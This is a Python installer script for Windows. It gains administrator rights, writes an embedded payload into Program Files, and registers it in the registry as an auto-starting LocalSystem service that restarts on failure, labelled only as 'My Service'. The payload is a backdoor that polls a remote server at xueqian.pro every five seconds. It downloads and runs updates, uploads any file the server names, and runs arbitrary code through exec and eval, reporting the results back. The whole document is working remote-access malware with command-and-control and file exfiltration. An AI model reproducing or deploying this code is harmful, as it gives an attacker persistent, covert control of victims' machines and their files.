import winreg, sys, ctypes, zipfile, os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

os.mkdir('C:\Program Files\sb')
x = open('C:\Program Files\sb\me.py', 'w')
x.write('''#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 1.0.0         #
import importlib
import sys
import time
import win32api
import win32event
import win32service
import win32serviceutil
import servicemanager

requests = importlib.import_module('requests')
socket = importlib.import_module('socket')
psutil = importlib.import_module('psutil')
os = importlib.import_module('os')
imports = {}

s = 5
name = socket.gethostname()
host = 'http://xueqian.pro:1902'
# host = 'http://192.168.3.10:1902'


def _import(name):
    try:
        imports[name] = importlib.import_module(name)
        return 'Succeed'
    except Exception as e:
        return str(e)


class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyService"
    _svc_display_name_ = "My Service"
    _svc_description_ = "My Service"

    def __init__(self, args):
        self.log('init')
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.log('start')
            self.start()
            self.log('wait')
            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
            self.log('done')
        except BaseException as e:
            self.log('Exception : %s' % e)
            self.SvcStop()

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.log('stopping')
        self.stop()
        self.log('stopped')
        win32event.SetEvent(self.stop_event)
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

    def start(self):
        global s
        while 1:
            try:
                a = requests.post(host, json={'name': name}).json()
            except:
                time.sleep(5)
                s = 0
                continue

            # try:
            if 1:
                if a['jieguo'] is None:
                    if s == 5:
                        # time.sleep(15)
                        pass
                    else:
                        s += 1
                elif a['jieguo'] == 'gengxin':
                    requests.post(host, json={'name': name, 'headers': 'return', 'type': 'update'})
                    from urllib.request import urlretrieve
                    urlretrieve("http://xueqian.pro:1902/update", sys.argv[0] + '.py')
                    os.startfile(sys.argv[0] + '.py')
                    sys.exit()
                elif a['jieguo'] == 'sendfile':
                    s = 0
                    requests.post(host, json={'name': name, 'headers': 'return', 'type': 'sendfile', 'os': a["shuju"],
                                              'file': str(open(a["shuju"], 'rb').read())})
                elif a['jieguo'] == 'commands':
                    s = 0
                    try:
                        exec(a["shuju"])
                        resurt = str(eval(a["fanhui"]))
                    except Exception as e:
                        resurt = str(e)
                    requests.post(host,
                                  json={'name': name, 'headers': 'return', 'os': [a["jieguo"], a["shuju"], a["fanhui"]],
                                        'type': '_os', 'reason': resurt})
                else:
                    s = 0
                    try:
                        resurt = str(eval(a["shuju"]))
                    except Exception as e:
                        resurt = str(e)
                    requests.post(host, json={'name': name, 'headers': 'return', 'os': [a["jieguo"], a["shuju"]],
                                              'type': 'os', 'reason': resurt})
            # except Exception as e:
            #     print(e)
            time.sleep(5)

    def stop(self):
        pass

    def log(self, msg):
        servicemanager.LogInfoMsg(str(msg))

    def sleep(self, minute):
        win32api.Sleep((minute * 1000), True)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(MyService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(MyService)
''')
x.close()

y = zipfile.ZipFile(sys.argv[1])
y.extractall(r'C:\Program Files\sb\\')
y.close()

a = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\me')

winreg.SetValueEx(a, '(Default)', 0, winreg.REG_SZ, None)
winreg.SetValueEx(a, 'Description', 0, winreg.REG_SZ, 'me.py')
winreg.SetValueEx(a, 'Dir', 0, winreg.REG_SZ, r'C:\Program Files\sb\python')
winreg.SetValueEx(a, 'DisplayName', 0, winreg.REG_SZ, 'me.py')
winreg.SetValueEx(a, 'ErrorControl', 0, winreg.REG_DWORD, 1)
winreg.SetValueEx(a, 'FailureActions', 0, winreg.REG_BINARY, b'\x80\x51\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00')
winreg.SetValueEx(a, 'ImagePath', 0, winreg.REG_EXPAND_SZ, r'"C:\Program Files\sb\Python\pythonw.exe" "C:\Program Files\sb\me.py"')
winreg.SetValueEx(a, 'ObjectName', 0, winreg.REG_SZ, 'LocalSystem')
winreg.SetValueEx(a, 'Start', 0, winreg.REG_DWORD, 2)
winreg.SetValueEx(a, 'Type', 0, winreg.REG_DWORD, 272)
winreg.SetValueEx(a, 'Version', 0, winreg.REG_SZ, '88.88.88.88')
